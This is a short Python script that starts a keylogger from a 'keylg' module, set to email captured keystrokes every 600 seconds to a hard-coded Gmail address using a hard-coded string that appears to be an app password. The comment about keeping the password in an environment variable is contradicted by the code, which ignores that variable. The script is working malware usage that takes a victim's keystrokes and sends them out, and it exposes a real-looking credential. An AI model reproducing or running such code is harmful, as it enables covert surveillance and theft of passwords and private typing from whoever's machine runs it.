import keylg
import os

# Securely store your email password as an environment variable
email_password = os.environ.get('EMAIL_PASSWORD')

my_keylog = keylg.Keylog(600, "vijayalakshmivelu2004@gmail.com", 'rple owmo cugg pfsz')

try:
    my_keylog.start()
except Exception as e:
    print(f"An error occurred: {e}")
    